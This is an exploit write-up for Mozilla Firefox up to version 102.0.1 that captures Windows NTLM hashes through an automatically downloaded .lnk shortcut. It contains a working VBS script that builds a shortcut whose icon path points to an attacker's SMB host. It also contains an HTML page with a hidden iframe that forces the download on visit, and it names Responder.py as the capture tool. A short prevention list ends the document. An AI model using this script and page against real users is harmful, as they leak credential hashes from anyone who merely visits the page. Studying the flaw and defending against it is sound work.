# Mozilla FireFox - NTLM Hashes capture via lnk download
```
Date: 07/09/2022
Exploit Author: AkuCyberSec (https://github.com/AkuCyberSec)
Vendor Homepage: https://www.mozilla.org/
Software Link: https://www.mozilla.org/en-US/firefox/all/#product-desktop-release
Version: <= 102.0.1
Tested on: FireFox 101.0.1, 102.0.1 | Windows 10 64-bit
Proof of concept: https://youtu.be/Ml_jE-pwisI
```

## VULNERABILITY DESCRIPTION
This vulnerability allows an attacker to capture NTLM hashes just by making the victim visit a web page.
Before writing any code, let's understand how it works.

Mozilla FireFox, just like other browsers, comes with a default settings: it automatically downloads files in the Downloads folder.
Usually this would not be a big problem but there is something that makes this default setting very dangerous: the .lnk files can be downloaded without any restriction.
Maybe now you will have some questions.

1. What are .lnk files? 
When you want to create a link to a file or to a folder, Windows creates a file with the extension .lnk
 
2. Why are the .lnk files so dangerous?
These files have a property called "IconLocation". This property tells the OS where to search for the icon.
Icons can be loaded from the local disk (e.g. C:\path\icon.ico), or from an external resource (e.g. a file server like \\fileserver\icon.ico)

Whenever the user opens a folder that contains a .lnk file, Windows automatically tries to get the icon.
The user does not even need to click the .lnk file.

What if the download folder was set on "Desktop"?
The user does not need to open any folder, because Windows would try to get the icon once the download is completed.

### Create the icon
We can crete the icon using several ways.
Here is a VBS script to create the link file on Windows.
Create a .vbs files (e.g. make_link.vbs) with the following code, then execute the file by double clicking it.

```
Set objShell = WScript.CreateObject("WScript.Shell")
Set lnk = objShell.CreateShortcut("evil_link.lnk")
lnk.TargetPath = "" 	' Not required
lnk.Arguments = "" 		' Not required
lnk.Description = "" 	' Not required
lnk.IconLocation = "\\<attacker_ip_address>\pwnd" ' Change attacker_ip_address
lnk.WorkingDirectory = "" ' Not required
lnk.Save
```

The "attacker_ip_address" must be the address of a machine that can capture the NTLM hash (e.g. a Kali machine that runs Responder.py)

### Create the web page to download the file automatically
The .vbs script will create a link file called "evil_link.lnk".
Using the following code, we can create a web page that will automatically download the file.

```
<html>
	<head>
		<title>Pwnd!</title>
	</head>
	<body>
		<h1>Pwnd</h1>
		<iframe id="frame" style="display:none;"></iframe>

		<script>
			document.getElementById('frame').src = "evil_link.lnk"
		</script>
	</body>
</html>
```

### How to prevent
1. Do NOT allow the browser to download anything without the permission
2. If the automatic download can't be disabled, avoid downloading automatically on the Desktop
3. If a .lnk file is downloaded, delete it without opening the folder. It can be deleted from FireFox or using the cmd.
4. After the .lnk is deleted do NOT open the Recycle Bin (it would act as a normal folder). Instead, empty the Recycle Bin.
5. Configure the firewall to connect only to trusted SMB Server
